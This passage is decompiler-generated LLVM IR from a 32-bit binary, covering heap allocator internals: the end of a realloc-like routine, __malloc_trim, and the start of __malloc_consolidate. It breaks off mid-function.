  %v3_805298f = inttoptr i32 %v2_805298f to i32*
  store i32 %v3_805298c, i32* %v3_805298f, align 4
  %tmp23 = icmp ult i32 %v0_8052986, 9
  br i1 %tmp23, label %dec_label_pc_80529a0, label %dec_label_pc_8052994

dec_label_pc_8052994:                             ; preds = %dec_label_pc_8052983
  %v0_8052994 = load i32, i32* @esi, align 4
  %v1_8052994 = add i32 %v0_8052994, 28
  %v2_8052994 = inttoptr i32 %v1_8052994 to i32*
  %v3_8052994 = load i32, i32* %v2_8052994, align 4
  store i32 %v3_8052994, i32* %eax.global-to-local, align 4
  %v1_8052997 = load i32, i32* @edx, align 4
  %v2_8052997 = add i32 %v1_8052997, 28
  %v3_8052997 = inttoptr i32 %v2_8052997 to i32*
  store i32 %v3_8052994, i32* %v3_8052997, align 4
  %v0_805299a = load i32, i32* @esi, align 4
  %v1_805299a = add i32 %v0_805299a, 32
  %v2_805299a = inttoptr i32 %v1_805299a to i32*
  %v3_805299a = load i32, i32* %v2_805299a, align 4
  store i32 %v3_805299a, i32* %eax.global-to-local, align 4
  %v1_805299d = load i32, i32* @edx, align 4
  %v2_805299d = add i32 %v1_805299d, 32
  %v3_805299d = inttoptr i32 %v2_805299d to i32*
  store i32 %v3_805299a, i32* %v3_805299d, align 4
  br label %dec_label_pc_80529a0

dec_label_pc_80529a0:                             ; preds = %dec_label_pc_8052983, %dec_label_pc_8052972, %dec_label_pc_8052959, %dec_label_pc_8052948, %dec_label_pc_8052994
  %v0_80529a3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80529a3 = add i32 %v0_80529a3, 8
  store i32 %v1_80529a3, i32* @ebx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80529aa = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_8052ad0

dec_label_pc_80529b4:                             ; preds = %dec_label_pc_8052875, %dec_label_pc_805292b, %dec_label_pc_80528f9
  %v1_80529c5 = phi i32 [ %v1_8052865, %dec_label_pc_8052875 ], [ %v2_8052932, %dec_label_pc_805292b ], [ %v0_80529b4.pre, %dec_label_pc_80528f9 ]
  %v5_80529b6 = sub i32 %v1_80529c5, %stack_var_-40.0
  store i32 %v5_80529b6, i32* %ecx.global-to-local, align 4
  %tmp24 = icmp ult i32 %v5_80529b6, 16
  br i1 %tmp24, label %dec_label_pc_80529bf, label %dec_label_pc_80529d1

dec_label_pc_80529bf:                             ; preds = %dec_label_pc_80529b4
  %v0_80529bf = load i32, i32* @edi, align 4
  %v1_80529bf = add i32 %v0_80529bf, 4
  %v2_80529bf = inttoptr i32 %v1_80529bf to i32*
  %v3_80529bf = load i32, i32* %v2_80529bf, align 4
  %v1_80529c2 = urem i32 %v3_80529bf, 2
  %v2_80529c5 = or i32 %v1_80529c2, %v1_80529c5
  store i32 %v2_80529c5, i32* %eax.global-to-local, align 4
  store i32 %v2_80529c5, i32* %v2_80529bf, align 4
  %v0_80529ca = load i32, i32* @edi, align 4
  %v1_80529ca = load i32, i32* @ebx, align 4
  %v2_80529ca = add i32 %v0_80529ca, 4
  %v3_80529ca = add i32 %v2_80529ca, %v1_80529ca
  %v4_80529ca = inttoptr i32 %v3_80529ca to i32*
  %v5_80529ca = load i32, i32* %v4_80529ca, align 4
  %v6_80529ca = or i32 %v5_80529ca, 1
  store i32 %v6_80529ca, i32* %v4_80529ca, align 4
  br label %dec_label_pc_8052a01

dec_label_pc_80529d1:                             ; preds = %dec_label_pc_80529b4
  %v0_80529d5 = load i32, i32* @edi, align 4
  %v2_80529d5 = add i32 %v0_80529d5, %stack_var_-40.0
  store i32 %v2_80529d5, i32* %eax.global-to-local, align 4
  %v1_80529d8 = add i32 %v0_80529d5, 4
  %v2_80529d8 = inttoptr i32 %v1_80529d8 to i32*
  %v3_80529d8 = load i32, i32* %v2_80529d8, align 4
  %v1_80529db = urem i32 %v3_80529d8, 2
  %v5_80529de = or i32 %v1_80529db, %stack_var_-40.0
  store i32 %v5_80529de, i32* %v2_80529d8, align 4
  %v0_80529e8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80529ea = or i32 %v0_80529e8, 1
  store i32 %v1_80529ea, i32* @edx, align 4
  %v1_80529ed = load i32, i32* %eax.global-to-local, align 4
  %v2_80529ed = add i32 %v1_80529ed, 4
  %v3_80529ed = inttoptr i32 %v2_80529ed to i32*
  store i32 %v1_80529ea, i32* %v3_80529ed, align 4
  %v0_80529f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80529f0 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80529f0 = add i32 %v0_80529f0, 4
  %v3_80529f0 = add i32 %v2_80529f0, %v1_80529f0
  %v4_80529f0 = inttoptr i32 %v3_80529f0 to i32*
  %v5_80529f0 = load i32, i32* %v4_80529f0, align 4
  %v6_80529f0 = or i32 %v5_80529f0, 1
  store i32 %v6_80529f0, i32* %v4_80529f0, align 4
  %v0_80529f5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80529f5 = add i32 %v0_80529f5, 8
  store i32 %v1_80529f5, i32* %eax.global-to-local, align 4
  store i32 %v1_80529f5, i32* %stack_var_-60, align 4
  %v1_80529f9 = call i32 @free(i32 %v1_80529f5)
  store i32 %v1_80529f9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052a01

dec_label_pc_8052a01:                             ; preds = %dec_label_pc_80529bf, %dec_label_pc_80529d1
  %v0_8052a01 = load i32, i32* @edi, align 4
  %v1_8052a01 = add i32 %v0_8052a01, 8
  store i32 %v1_8052a01, i32* @ebx, align 4
  br label %dec_label_pc_8052add

dec_label_pc_8052a09:                             ; preds = %dec_label_pc_8052859
  store i32 %tmp7, i32* %ecx.global-to-local, align 4
  %v0_8052a0d = load i32, i32* @global_var_8067bfc.737, align 4
  %v1_8052a12 = add i32 %v0_8052a0d, -1
  store i32 %v1_8052a12, i32* %eax.global-to-local, align 4
  %v2_8052a17 = inttoptr i32 %v1_805285d to i32*
  %v3_8052a17 = load i32, i32* %v2_8052a17, align 4
  store i32 %v3_8052a17, i32* @ebp, align 4
  %v1_8052a1a = or i32 %stack_var_-40.0, 4
  store i32 %v1_8052a1a, i32* %stack_var_-44, align 4
  %v2_8052a20 = add i32 %v3_8052a17, %v1_8052a12
  store i32 %v2_8052a20, i32* @edx, align 4
  %v1_8052a23 = sub i32 0, %v0_8052a0d
  store i32 %v1_8052a23, i32* %eax.global-to-local, align 4
  %v2_8052a25 = add i32 %v2_8052a20, %v1_8052a1a
  %v2_8052a28 = and i32 %v2_8052a25, %v1_8052a23
  store i32 %v2_8052a28, i32* @esi, align 4
  %v2_8052a2c = sub i32 %v2_8052a28, %v3_8052a17
  store i32 %v2_8052a2c, i32* @ebx, align 4
  %v15_8052a2e = icmp eq i32 %v1_8052865, %v2_8052a2c
  br i1 %v15_8052a2e, label %dec_label_pc_8052ad9, label %dec_label_pc_8052a38

dec_label_pc_8052a38:                             ; preds = %dec_label_pc_8052a09
  %v2_8052a3f = sub i32 %v1_805285d, %v3_8052a17
  store i32 %v2_8052a3f, i32* @edi, align 4
  %v2_8052a41 = add i32 %v3_8052a17, %v1_8052865
  store i32 %v2_8052a41, i32* %eax.global-to-local, align 4
  store i32 %v2_8052a3f, i32* %stack_var_-60, align 4
  %v6_8052a45 = call i32 @mremap(i32 %v2_8052a3f, i32 %v2_8052a41, i32 %v2_8052a28, i32 1, i32 %v1_8052a1a, i32 %v1_8052865)
  store i32 %v6_8052a45, i32* %eax.global-to-local, align 4
  %v10_8052a4d = icmp eq i32 %v6_8052a45, -1
  br i1 %v10_8052a4d, label %dec_label_pc_8052a91, label %dec_label_pc_8052a52

dec_label_pc_8052a52:                             ; preds = %dec_label_pc_8052a38
  %v1_8052a52 = load i32, i32* @ebp, align 4
  %v2_8052a52 = add i32 %v1_8052a52, %v6_8052a45
  store i32 %v2_8052a52, i32* @edx, align 4
  %v0_8052a55 = load i32, i32* @ebx, align 4
  %v1_8052a55 = or i32 %v0_8052a55, 2
  store i32 %v1_8052a55, i32* %ebx.global-to-local, align 4
  %v0_8052a58 = load i32, i32* @esi, align 4
  store i32 %v0_8052a58, i32* %eax.global-to-local, align 4
  %v2_8052a5a = add i32 %v2_8052a52, 4
  %v3_8052a5a = inttoptr i32 %v2_8052a5a to i32*
  store i32 %v1_8052a55, i32* %v3_8052a5a, align 4
  %v0_8052a5d = load i32, i32* %eax.global-to-local, align 4
  %v5_8052a5d = sub i32 %v0_8052a5d, %v1_8052865
  %v1_8052a61 = load i32, i32* @global_var_8067c04.742, align 4
  %v2_8052a61 = add i32 %v1_8052a61, %v5_8052a5d
  store i32 %v2_8052a61, i32* %eax.global-to-local, align 4
  store i32 %v2_8052a61, i32* @global_var_8067c04.742, align 4
  %v1_8052a6c = load i32, i32* @global_var_8067c10.743, align 16
  %tmp25 = icmp ugt i32 %v2_8052a61, %v1_8052a6c
  br i1 %tmp25, label %dec_label_pc_8052a74, label %dec_label_pc_8052a79

dec_label_pc_8052a74:                             ; preds = %dec_label_pc_8052a52
  store i32 %v2_8052a61, i32* @global_var_8067c10.743, align 16
  br label %dec_label_pc_8052a79

dec_label_pc_8052a79:                             ; preds = %dec_label_pc_8052a52, %dec_label_pc_8052a74
  %v1_8052a79 = load i32, i32* @global_var_8067c08.744, align 8
  %v2_8052a79 = add i32 %v1_8052a79, %v2_8052a61
  store i32 %v2_8052a79, i32* %eax.global-to-local, align 4
  %v1_8052a7f = load i32, i32* @global_var_8067c14.745, align 4
  %tmp26 = icmp ugt i32 %v2_8052a79, %v1_8052a7f
  br i1 %tmp26, label %dec_label_pc_8052a87, label %dec_label_pc_8052a8c

dec_label_pc_8052a87:                             ; preds = %dec_label_pc_8052a79
  store i32 %v2_8052a79, i32* @global_var_8067c14.745, align 4
  br label %dec_label_pc_8052a8c

dec_label_pc_8052a8c:                             ; preds = %dec_label_pc_8052a79, %dec_label_pc_8052a87
  %v0_8052a8c = load i32, i32* @edx, align 4
  %v1_8052a8c = add i32 %v0_8052a8c, 8
  store i32 %v1_8052a8c, i32* @ebx, align 4
  br label %dec_label_pc_8052add

dec_label_pc_8052a91:                             ; preds = %dec_label_pc_8052a38
  %v2_8052a91 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8052a91, i32* %eax.global-to-local, align 4
  %v10_8052a94 = icmp ult i32 %v1_8052865, %v2_8052a91
  %v1_8052a98 = icmp eq i1 %v10_8052a94, false
  br i1 %v1_8052a98, label %dec_label_pc_8052ad9, label %dec_label_pc_8052a9a

dec_label_pc_8052a9a:                             ; preds = %dec_label_pc_8052a91
  %v1_8052aa1 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8052aa1, i32* %eax.global-to-local, align 4
  store i32 %v1_8052aa1, i32* %stack_var_-60, align 4
  %v1_8052aa5 = call i32 @malloc(i32 %v1_8052aa1)
  store i32 %v1_8052aa5, i32* %eax.global-to-local, align 4
  store i32 %v1_8052aa5, i32* @ebx, align 4
  %v1_8052aaf = icmp eq i32 %v1_8052aa5, 0
  br i1 %v1_8052aaf, label %dec_label_pc_8052ad5, label %dec_label_pc_8052ab3

dec_label_pc_8052ab3:                             ; preds = %dec_label_pc_8052a9a
  %v1_8052ab8 = add i32 %v1_8052865, -8
  store i32 %v1_8052ab8, i32* %eax.global-to-local, align 4
  store i32 %v1_8052aa5, i32* %stack_var_-60, align 4
  %v3_8052ac1 = inttoptr i32 %v1_8052aa5 to i16*
  %v4_8052ac1 = call i32 @memcpy(i16* %v3_8052ac1, i32 %tmp7, i32 %v1_8052ab8)
  store i32 %v4_8052ac1, i32* %eax.global-to-local, align 4
  store i32 %v1_8052aa5, i32* @edx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8052acb = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_8052ad0

dec_label_pc_8052ad0:                             ; preds = %dec_label_pc_80529a0, %dec_label_pc_8052ab3
  %storemerge = phi i32 [ %v1_8052acb, %dec_label_pc_8052ab3 ], [ %v1_80529aa, %dec_label_pc_80529a0 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052add

dec_label_pc_8052ad5:                             ; preds = %dec_label_pc_8052a9a, %dec_label_pc_8052904
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8052add

dec_label_pc_8052ad9:                             ; preds = %dec_label_pc_8052a91, %dec_label_pc_8052a09, %dec_label_pc_80528a3
  store i32 %tmp7, i32* @ebx, align 4
  br label %dec_label_pc_8052add

dec_label_pc_8052add:                             ; preds = %dec_label_pc_8052ad5, %dec_label_pc_8052ad0, %dec_label_pc_8052a8c, %dec_label_pc_8052a01, %dec_label_pc_8052ad9
  store i32 %v2_8052812, i32* @eax, align 4
  store i32 %v2_8052812, i32* %stack_var_-60, align 4
  %v2_8052ae6 = call i32 @__pthread_return_void(i32 %v2_8052812, i32 1)
  store i32 %v2_8052ae6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052aeb

dec_label_pc_8052aeb:                             ; preds = %dec_label_pc_80527f6, %dec_label_pc_80527e2, %dec_label_pc_8052add
  br label %dec_label_pc_8052aee

dec_label_pc_8052aee:                             ; preds = %dec_label_pc_8052830, %dec_label_pc_8052aeb
  %v0_8052af1 = load i32, i32* @ebx, align 4
  store i32 %v0_8052af1, i32* %eax.global-to-local, align 4
  store i32 %v0_80527d3, i32* %ebx.global-to-local, align 4
  store i32 %v0_80527d2, i32* @esi, align 4
  ret i32 %v0_8052af1

; uselistorder directives
  uselistorder i32 %v1_8052aa5, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8052a79, { 1, 0, 2 }
  uselistorder i32 %v2_8052a61, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8052a3f, { 1, 0, 2 }
  uselistorder i32 %v1_8052a1a, { 1, 0, 2 }
  uselistorder i32 %v3_8052a17, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_80529d5, { 1, 0 }
  uselistorder i32 %v1_805293b, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_805290f, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_80528b3, { 1, 0, 2 }
  uselistorder i32 %v3_80528c6, { 0, 2, 1 }
  uselistorder i32 %v2_8052883, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8052865, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_805285d, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_8052852, { 1, 0 }
  uselistorder i32 %v1_8052842, { 0, 2, 1 }
  uselistorder i32 %v0_805282b, { 1, 0 }
  uselistorder i32 %v2_8052812, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 50, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 38, 41, 42, 43, 44, 0, 45, 46, 47, 48, 49 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8052aee, { 1, 0 }
  uselistorder label %dec_label_pc_8052aeb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052add, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052ad0, { 1, 0 }
  uselistorder label %dec_label_pc_8052a8c, { 1, 0 }
  uselistorder label %dec_label_pc_8052a79, { 1, 0 }
  uselistorder label %dec_label_pc_8052a01, { 1, 0 }
  uselistorder label %dec_label_pc_80529b4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80529a0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80528f9, { 1, 0 }
  uselistorder label %dec_label_pc_8052859, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_8052aff = load i32, i32* @edx, align 4
  store i32 %v0_8052aff, i32* %ebp.global-to-local, align 4
  %v1_8052b01 = add i32 %v0_8052aff, 860
  %v2_8052b01 = inttoptr i32 %v1_8052b01 to i32*
  %v3_8052b01 = load i32, i32* %v2_8052b01, align 4
  store i32 %v3_8052b01, i32* @ecx, align 4
  %v1_8052b07 = add i32 %v0_8052aff, 44
  %v2_8052b07 = inttoptr i32 %v1_8052b07 to i32*
  %v3_8052b07 = load i32, i32* %v2_8052b07, align 4
  %v1_8052b0a = add i32 %v3_8052b07, 4
  %v2_8052b0a = inttoptr i32 %v1_8052b0a to i32*
  %v3_8052b0a = load i32, i32* %v2_8052b0a, align 4
  %v1_8052b0d = and i32 %v3_8052b0a, -4
  store i32 %v1_8052b0d, i32* @esi, align 4
  %v1_8052b12 = load i32, i32* @eax, align 4
  %v2_8052b12 = add i32 %v3_8052b01, -17
  %v2_8052b14 = add i32 %v2_8052b12, %v1_8052b0d
  %v3_8052b14 = sub i32 %v2_8052b14, %v1_8052b12
  %div = udiv i32 %v3_8052b14, %v3_8052b01
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8052b14, %v3_8052b01
  store i32 %tmp10, i32* @edx, align 4
  %v1_8052b1c = add i32 %div, -1
  %v4_8052b1f = mul i32 %v1_8052b1c, %v3_8052b01
  store i32 %v4_8052b1f, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8052b1f, 1
  br i1 %tmp11, label %dec_label_pc_8052b7b, label %dec_label_pc_8052b26

dec_label_pc_8052b26:                             ; preds = %entry
  %v1_8052b2b = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052b2b, i32* %edi.global-to-local, align 4
  %v0_8052b32 = load i32, i32* @esi, align 4
  store i32 %v0_8052b32, i32* %eax.global-to-local, align 4
  %v1_8052b34 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052b34 = add i32 %v1_8052b34, 44
  %v3_8052b34 = inttoptr i32 %v2_8052b34 to i32*
  %v4_8052b34 = load i32, i32* %v3_8052b34, align 4
  %v5_8052b34 = add i32 %v4_8052b34, %v0_8052b32
  store i32 %v5_8052b34, i32* %eax.global-to-local, align 4
  %v12_8052b3a = icmp eq i32 %v1_8052b2b, %v5_8052b34
  %v1_8052b3c = icmp eq i1 %v12_8052b3a, false
  br i1 %v1_8052b3c, label %dec_label_pc_8052b7b, label %dec_label_pc_8052b3e

dec_label_pc_8052b3e:                             ; preds = %dec_label_pc_8052b26
  %v1_8052b41 = sub i32 0, %v4_8052b1f
  store i32 %v1_8052b41, i32* @ebx, align 4
  %v1_8052b44 = call i32 @__GI_sbrk(i32 %v1_8052b41)
  store i32 %v1_8052b44, i32* %eax.global-to-local, align 4
  %v1_8052b50 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052b50, i32* %eax.global-to-local, align 4
  %v10_8052b58 = icmp eq i32 %v1_8052b50, -1
  br i1 %v10_8052b58, label %dec_label_pc_8052b7b, label %dec_label_pc_8052b5d

dec_label_pc_8052b5d:                             ; preds = %dec_label_pc_8052b3e
  %v0_8052b5d = load i32, i32* %edi.global-to-local, align 4
  %v2_8052b5f = sub i32 %v0_8052b5d, %v1_8052b50
  %v12_8052b5f = icmp eq i32 %v2_8052b5f, 0
  store i32 %v2_8052b5f, i32* @ecx, align 4
  br i1 %v12_8052b5f, label %dec_label_pc_8052b7b, label %dec_label_pc_8052b63

dec_label_pc_8052b63:                             ; preds = %dec_label_pc_8052b5d
  %v0_8052b63 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052b63 = add i32 %v0_8052b63, 44
  %v2_8052b63 = inttoptr i32 %v1_8052b63 to i32*
  %v3_8052b63 = load i32, i32* %v2_8052b63, align 4
  store i32 %v3_8052b63, i32* %eax.global-to-local, align 4
  %v1_8052b66 = add i32 %v0_8052b63, 872
  %v2_8052b66 = inttoptr i32 %v1_8052b66 to i32*
  %v3_8052b66 = load i32, i32* %v2_8052b66, align 4
  %v5_8052b66 = sub i32 %v3_8052b66, %v2_8052b5f
  store i32 %v5_8052b66, i32* %v2_8052b66, align 4
  %v0_8052b6c = load i32, i32* @esi, align 4
  %v1_8052b6c = load i32, i32* @ecx, align 4
  %v2_8052b6c = sub i32 %v0_8052b6c, %v1_8052b6c
  %v1_8052b6e = or i32 %v2_8052b6c, 1
  %v1_8052b71 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052b71 = add i32 %v1_8052b71, 4
  %v3_8052b71 = inttoptr i32 %v2_8052b71 to i32*
  store i32 %v1_8052b6e, i32* %v3_8052b71, align 4
  br label %dec_label_pc_8052b7d

dec_label_pc_8052b7b:                             ; preds = %dec_label_pc_8052b5d, %dec_label_pc_8052b3e, %dec_label_pc_8052b26, %entry
  br label %dec_label_pc_8052b7d

dec_label_pc_8052b7d:                             ; preds = %dec_label_pc_8052b63, %dec_label_pc_8052b7b
  %storemerge = phi i32 [ 1, %dec_label_pc_8052b63 ], [ 0, %dec_label_pc_8052b7b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8052b50, { 1, 0, 2 }
  uselistorder i32 %v4_8052b1f, { 1, 2, 0 }
  uselistorder i32 %v3_8052b01, { 0, 3, 2, 1, 4 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8052b7d, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_8052b86 = load i32, i32* @edi, align 4
  %v0_8052b87 = load i32, i32* @esi, align 4
  %v0_8052b88 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8052b90 = load i32, i32* %arg1, align 4
  store i32 %v2_8052b90, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8052b97 = icmp eq i32 %v2_8052b90, 0
  br i1 %v1_8052b97, label %dec_label_pc_8052cc0.preheader, label %dec_label_pc_8052b9f

dec_label_pc_8052cc0.preheader:                   ; preds = %entry
  %v3_8052cb5 = add i32 %tmp11, 44
  br label %dec_label_pc_8052cb1

dec_label_pc_8052b9f:                             ; preds = %entry
  %v1_8052ba3 = and i32 %v2_8052b90, -3
  store i32 %v1_8052ba3, i32* %arg1, align 4
  %v1_8052ba8 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_8052bb3 = add i32 %tmp11, 4
  store i32 %v1_8052bb3, i32* %eax.global-to-local, align 4
  %v2_8052bbe = load i32, i32* %arg1, align 4
  %v2_8052bc4 = udiv i32 %v2_8052bbe, 8
  %v2_8052bc7 = mul nuw i32 %v2_8052bc4, 4
  %v3_8052bc7 = add i32 %tmp11, -4
  %v4_8052bc7 = add i32 %v3_8052bc7, %v2_8052bc7
  store i32 %v4_8052bc7, i32* %eax.global-to-local, align 4
  %v2_8052c8e = add i32 %tmp11, 44
  %v3_8052c8e = inttoptr i32 %v2_8052c8e to i32*
  %v1_8052c61 = add i32 %tmp11, 60
  %v2_8052c61 = inttoptr i32 %v1_8052c61 to i32*
  br label %dec_label_pc_8052bcf

dec_label_pc_8052bcf:                             ; preds = %dec_label_pc_8052ca7, %dec_label_pc_8052b9f
  %v0_8052bdd = phi i32 [ %v1_8052bb3, %dec_label_pc_8052b9f ], [ %v4_8052ca7, %dec_label_pc_8052ca7 ]
  store i32 %v0_8052bdd, i32* %eax.global-to-local, align 4
  %v1_8052bd3 = inttoptr i32 %v0_8052bdd to i32*
  %v2_8052bd3 = load i32, i32* %v1_8052bd3, align 4
  store i32 %v2_8052bd3, i32* @ecx, align 4
  %v1_8052bd5 = icmp eq i32 %v2_8052bd3, 0
  br i1 %v1_8052bd5, label %dec_label_pc_8052c9d, label %dec_label_pc_8052bdd

dec_label_pc_8052bdd:                             ; preds = %dec_label_pc_8052bcf
  store i32 0, i32* %v1_8052bd3, align 4
  %v0_8052be3.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052be3

dec_label_pc_8052be3:                             ; preds = %dec_label_pc_8052c91, %dec_label_pc_8052bdd
  %v0_8052c00 = phi i32 [ %v3_8052be3, %dec_label_pc_8052c91 ], [ %v0_8052be3.pre, %dec_label_pc_8052bdd ]
  %v1_8052be3 = add i32 %v0_8052c00, 8
  %v2_8052be3 = inttoptr i32 %v1_8052be3 to i32*
  %v3_8052be3 = load i32, i32* %v2_8052be3, align 4
  store i32 %v3_8052be3, i32* %edx.global-to-local, align 4
  %v1_8052bea = add i32 %v0_8052c00, 4
  %v2_8052bea = inttoptr i32 %v1_8052bea to i32*
  %v3_8052bea = load i32, i32* %v2_8052bea, align 4
  store i32 %v3_8052bea, i32* %eax.global-to-local, align 4
  %v1_8052bef = and i32 %v3_8052bea, -2
  store i32 %v1_8052bef, i32* @edi, align 4
  %v2_8052bf2 = urem i32 %v3_8052bea, 2
  %v3_8052bf2 = icmp eq i32 %v2_8052bf2, 0
  %v2_8052bf4 = add i32 %v1_8052bef, %v0_8052c00
  store i32 %v2_8052bf4, i32* @ebx, align 4
  %v1_8052bf7 = add i32 %v2_8052bf4, 4
  %v2_8052bf7 = inttoptr i32 %v1_8052bf7 to i32*
  %v3_8052bf7 = load i32, i32* %v2_8052bf7, align 4
  store i32 %v3_8052bf7, i32* %edx.global-to-local, align 4
  %v1_8052bfe = icmp eq i1 %v3_8052bf2, false
  br i1 %v1_8052bfe, label %dec_label_pc_8052c20, label %dec_label_pc_8052c00

dec_label_pc_8052c00:                             ; preds = %dec_label_pc_8052be3
  %v1_8052c00 = inttoptr i32 %v0_8052c00 to i32*
  %v2_8052c00 = load i32, i32* %v1_8052c00, align 4
  store i32 %v2_8052c00, i32* %ebp.global-to-local, align 4
  %v2_8052c04 = sub i32 %v0_8052c00, %v2_8052c00
  store i32 %v2_8052c04, i32* %eax.global-to-local, align 4
  %v1_8052c06 = add i32 %v2_8052c04, 8
  %v2_8052c06 = inttoptr i32 %v1_8052c06 to i32*
  %v3_8052c06 = load i32, i32* %v2_8052c06, align 4
  store i32 %v3_8052c06, i32* @esi, align 4
  %v1_8052c09 = add i32 %v2_8052c04, 12
  %v2_8052c09 = inttoptr i32 %v1_8052c09 to i32*
  %v3_8052c09 = load i32, i32* %v2_8052c09, align 4
  store i32 %v3_8052c09, i32* %edx.global-to-local, align 4
  %v1_8052c0c = add i32 %v3_8052c06, 12
  %v2_8052c0c = inttoptr i32 %v1_8052c0c to i32*
  %v3_8052c0c = load i32, i32* %v2_8052c0c, align 4
  store i32 %v3_8052c0c, i32* @ecx, align 4
  %v12_8052c0f = icmp eq i32 %v3_8052c0c, %v2_8052c04
  %v1_8052c11 = icmp eq i1 %v12_8052c0f, false
  br i1 %v1_8052c11, label %dec_label_pc_8052c50, label %dec_label_pc_8052c13

dec_label_pc_8052c13:                             ; preds = %dec_label_pc_8052c00
  %v1_8052c13 = add i32 %v3_8052c09, 8
  %v2_8052c13 = inttoptr i32 %v1_8052c13 to i32*
  %v3_8052c13 = load i32, i32* %v2_8052c13, align 4
  %v15_8052c13 = icmp eq i32 %v3_8052c13, %v3_8052c0c
  %v1_8052c16 = icmp eq i1 %v15_8052c13, false
  br i1 %v1_8052c16, label %dec_label_pc_8052c50, label %dec_label_pc_8052c18

dec_label_pc_8052c18:                             ; preds = %dec_label_pc_8052c13
  %v2_8052c18 = add i32 %v2_8052c00, %v1_8052bef
  store i32 %v2_8052c18, i32* @edi, align 4
  store i32 %v3_8052c09, i32* %v2_8052c0c, align 4
  %v0_8052c1d = load i32, i32* @esi, align 4
  %v1_8052c1d = load i32, i32* %edx.global-to-local, align 4
  %v2_8052c1d = add i32 %v1_8052c1d, 8
  %v3_8052c1d = inttoptr i32 %v2_8052c1d to i32*
  store i32 %v0_8052c1d, i32* %v3_8052c1d, align 4
  %v0_8052c2b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052c20

dec_label_pc_8052c20:                             ; preds = %dec_label_pc_8052be3, %dec_label_pc_8052c18
  %v1_8052c34 = phi i32 [ %v2_8052bf4, %dec_label_pc_8052be3 ], [ %v0_8052c2b.pre, %dec_label_pc_8052c18 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8052c28 = and i32 %v3_8052bf7, -4
  store i32 %v1_8052c28, i32* %ebp.global-to-local, align 4
  %v4_8052c2b = load i32, i32* %v3_8052c8e, align 4
  %v15_8052c2b = icmp eq i32 %v1_8052c34, %v4_8052c2b
  br i1 %v15_8052c2b, label %dec_label_pc_8052c81, label %dec_label_pc_8052c30

dec_label_pc_8052c30:                             ; preds = %dec_label_pc_8052c20
  %v2_8052c30 = add i32 %v1_8052c34, 4
  %v3_8052c30 = add i32 %v2_8052c30, %v1_8052c28
  %v4_8052c30 = inttoptr i32 %v3_8052c30 to i32*
  %v5_8052c30 = load i32, i32* %v4_8052c30, align 4
  store i32 %v5_8052c30, i32* %eax.global-to-local, align 4
  %v3_8052c34 = inttoptr i32 %v2_8052c30 to i32*
  store i32 %v1_8052c28, i32* %v3_8052c34, align 4
